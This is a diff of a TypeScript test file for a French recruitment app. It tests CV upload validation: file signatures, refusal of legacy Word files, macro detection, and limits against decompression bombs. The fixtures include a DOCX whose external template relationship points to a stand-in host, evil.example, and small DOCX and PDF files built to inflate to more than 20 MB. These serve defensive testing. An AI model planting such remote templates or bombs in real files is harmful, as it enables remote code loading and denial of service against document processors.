@@ -1,20 +1,47 @@
+import { deflateSync } from "node:zlib";
 import { describe, expect, it } from "vitest";
-import { validateCvFile } from "./recruitmentFileValidation";
+import { recruitmentCvValidationMessage, validateCvFile } from "./recruitmentFileValidation";
+import { DOCUMENT_DECOMPRESSION_LIMITS, truncateExtractedText } from "./documentDecompressionLimits";
+import { extractCvDocument } from "./recruitmentAnalysis";
+import { buildDocx } from "./testing/zipFixture";
 
+const DOCX = "application/vnd.openxmlformats-officedocument.wordprocessingml.document";
 const validPdf = Buffer.concat([Buffer.from("%PDF-1.7\n1 0 obj << /Type /Page >> endobj\n"), Buffer.alloc(300, 65)]);
 const validDoc = Buffer.concat([Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]), Buffer.alloc(300, 66)]);
-const validDocx = Buffer.concat([Buffer.from([0x50, 0x4b, 0x03, 0x04]), Buffer.from("[Content_Types].xml"), Buffer.alloc(300, 67)]);
+const validDocx = buildDocx(["Dr Docx Candidate", "Infirmier anesthésiste IADE — 6 ans d’expérience", "Langues : Français, Anglais"]);
+
+function pdfWithStream(dictionary: string, data: Buffer) {
+  return Buffer.concat([
+    Buffer.from("%PDF-1.7\n1 0 obj << /Type /Page >> endobj\n"),
+    Buffer.from(`2 0 obj << ${dictionary} /Length ${data.length} >>\nstream\n`, "latin1"),
+    data,
+    Buffer.from("\nendstream\nendobj\n%%EOF\n"),
+    Buffer.alloc(300, 32),
+  ]);
+}
 
 describe("validation et quarantaine des CV", () => {
-  it("accepte les signatures attendues pour PDF, DOC et DOCX", () => {
+  it("accepte les signatures attendues pour PDF et DOCX", () => {
     expect(validateCvFile({ buffer: validPdf, mimeType: "application/pdf", originalName: "cv.pdf", size: validPdf.length }).checksum).toHaveLength(64);
-    expect(validateCvFile({ buffer: validDoc, mimeType: "application/msword", originalName: "cv.doc", size: validDoc.length }).mimeType).toBe("application/msword");
-    expect(validateCvFile({ buffer: validDocx, mimeType: "application/vnd.openxmlformats-officedocument.wordprocessingml.document", originalName: "cv.docx", size: validDocx.length }).mimeType).toContain("officedocument");
+    expect(validateCvFile({ buffer: validDocx, mimeType: DOCX, originalName: "cv.docx", size: validDocx.length }).mimeType).toContain("officedocument");
+  });
+
+  it("refuse le format Word ancien (.doc) à l’envoi, mais traite encore un dossier .doc déjà stocké sans macro", () => {
+    expect(() => validateCvFile({ buffer: validDoc, mimeType: "application/msword", originalName: "cv.doc", size: validDoc.length })).toThrow("cv_validation_legacy_doc_refused");
+    expect(recruitmentCvValidationMessage("cv_validation_legacy_doc_refused")).toContain("PDF ou un DOCX");
+    expect(validateCvFile({ buffer: validDoc, mimeType: "application/msword", originalName: "cv.doc", size: validDoc.length, allowLegacyDoc: true }).mimeType).toBe("application/msword");
+    const macroDoc = Buffer.concat([validDoc, Buffer.from("_VBA_PROJECT", "utf16le"), Buffer.alloc(64)]);
+    expect(() => validateCvFile({ buffer: macroDoc, mimeType: "application/msword", originalName: "cv.doc", size: macroDoc.length, allowLegacyDoc: true })).toThrow("cv_validation_doc_active_content");
+    // A CV that merely mentions VBA as a skill is not a macro.
+    const skillDoc = Buffer.concat([validDoc, Buffer.from("Compétences : Excel VBA, Python", "utf16le")]);
+    expect(validateCvFile({ buffer: skillDoc, mimeType: "application/msword", originalName: "cv.doc", size: skillDoc.length, allowLegacyDoc: true }).mimeType).toBe("application/msword");
   });
 
   it("rejette une extension ou une signature qui ne correspond pas au type déclaré", () => {
     expect(() => validateCvFile({ buffer: validPdf, mimeType: "application/pdf", originalName: "cv.docx", size: validPdf.length })).toThrow("cv_validation_type_mismatch");
     expect(() => validateCvFile({ buffer: Buffer.alloc(300, 70), mimeType: "application/pdf", originalName: "cv.pdf", size: 300 })).toThrow("cv_validation_signature_invalid");
+    const fakeDocx = Buffer.concat([Buffer.from([0x50, 0x4b, 0x03, 0x04]), Buffer.from("[Content_Types].xml"), Buffer.alloc(300, 67)]);
+    expect(() => validateCvFile({ buffer: fakeDocx, mimeType: DOCX, originalName: "cv.docx", size: fakeDocx.length })).toThrow("cv_validation_docx_container_invalid");
   });
 
   it("rejette les PDF chiffrés, actifs ou excessivement longs avant analyse", () => {
@@ -26,8 +53,47 @@ describe("validation et quarantaine des CV", () => {
     expect(() => validateCvFile({ buffer: manyPages, mimeType: "application/pdf", originalName: "cv.pdf", size: manyPages.length })).toThrow("cv_validation_pdf_page_limit_exceeded");
   });
 
-  it("rejette les DOCX dotés de contenu externe ou embarqué", () => {
-    const activeDocx = Buffer.concat([validDocx, Buffer.from(' TargetMode="External"')]);
-    expect(() => validateCvFile({ buffer: activeDocx, mimeType: "application/vnd.openxmlformats-officedocument.wordprocessingml.document", originalName: "cv.docx", size: activeDocx.length })).toThrow("cv_validation_docx_active_content");
+  it("rejette les DOCX dotés de macros, d’objets intégrés ou d’un modèle distant, mais garde les liens hypertexte", () => {
+    const rawExternal = Buffer.concat([validDocx, Buffer.from(' TargetMode="External"')]);
+    expect(() => validateCvFile({ buffer: rawExternal, mimeType: DOCX, originalName: "cv.docx", size: rawExternal.length })).toThrow("cv_validation_docx_active_content");
+    const macro = buildDocx(["CV"], [{ name: "word/vbaProject.bin", content: Buffer.alloc(600, 65) }]);
+    expect(() => validateCvFile({ buffer: macro, mimeType: DOCX, originalName: "cv.docx", size: macro.length })).toThrow("cv_validation_docx_active_content");
+    const remoteTemplate = buildDocx(["CV"], [{ name: "word/_rels/settings.xml.rels", content: '<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://evil.example/t.dotm" TargetMode="External"/></Relationships>' }]);
+    expect(() => validateCvFile({ buffer: remoteTemplate, mimeType: DOCX, originalName: "cv.docx", size: remoteTemplate.length })).toThrow("cv_validation_docx_active_content");
+    const hyperlink = buildDocx(["CV"], [{ name: "word/_rels/document.xml.rels", content: '<Relationships><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://www.linkedin.com/in/example" TargetMode="External"/></Relationships>' }]);
+    expect(validateCvFile({ buffer: hyperlink, mimeType: DOCX, originalName: "cv.docx", size: hyperlink.length }).mimeType).toBe(DOCX);
+  });
+});
+
+describe("bombes de décompression : plafonds avant extraction", () => {
+  it("refuse un DOCX de quelques Ko qui se décompresse au-delà de 20 Mo", () => {
+    const bomb = buildDocx(["CV"], [{ name: "word/media/filler.bin", content: Buffer.alloc(DOCUMENT_DECOMPRESSION_LIMITS.docxMaxUncompressedBytes + 1024, 0) }]);
+    expect(bomb.length).toBeLessThan(100 * 1024);
+    expect(() => validateCvFile({ buffer: bomb, mimeType: DOCX, originalName: "cv.docx", size: bomb.length })).toThrow("cv_validation_docx_decompressed_size_exceeded");
+    expect(recruitmentCvValidationMessage("cv_validation_docx_decompressed_size_exceeded")).toContain("trop volumineux");
+  });
+
+  it("refuse un PDF dont les flux compressés dépassent le plafond, mais pas ses images", () => {
+    const flateBomb = pdfWithStream("/Filter /FlateDecode", deflateSync(Buffer.alloc(DOCUMENT_DECOMPRESSION_LIMITS.pdfMaxInflatedBytes + 1024, 32)));
+    expect(flateBomb.length).toBeLessThan(200 * 1024);
+    expect(() => validateCvFile({ buffer: flateBomb, mimeType: "application/pdf", originalName: "cv.pdf", size: flateBomb.length })).toThrow("cv_validation_pdf_decompressed_size_exceeded");
+
+    const normal = pdfWithStream("/Filter /FlateDecode", deflateSync(Buffer.from("BT /F1 12 Tf (Dr Candidat) Tj ET")));
+    expect(validateCvFile({ buffer: normal, mimeType: "application/pdf", originalName: "cv.pdf", size: normal.length }).pageCount).toBe(1);
+
+    const hugeImage = pdfWithStream("/Type /XObject /Subtype /Image /Width 100000 /Height 100000 /Filter /FlateDecode", deflateSync(Buffer.alloc(10)));
+    expect(() => validateCvFile({ buffer: hugeImage, mimeType: "application/pdf", originalName: "cv.pdf", size: hugeImage.length })).toThrow("cv_validation_pdf_image_too_large");
+  });
+
+  it("tronque le texte extrait à 200 000 caractères avec un avertissement", async () => {
+    expect(truncateExtractedText("abc", 2)).toEqual({ text: "ab", truncated: true });
+    const longDocx = buildDocx(Array.from({ length: 3_000 }, (_, index) => `Expérience ${index} : ${"anesthésie ".repeat(10)}`));
+    const extraction = await extractCvDocument(longDocx, DOCX);
+    expect(extraction.text.length).toBe(DOCUMENT_DECOMPRESSION_LIMITS.extractedTextMaxChars);
+    expect(extraction.warnings).toContain("extracted_text_truncated");
+    const shortDocx = buildDocx(["Dr Court", "IADE"]);
+    const short = await extractCvDocument(shortDocx, DOCX);
+    expect(short.text).toContain("Dr Court");
+    expect(short.warnings).not.toContain("extracted_text_truncated");
   });
 });
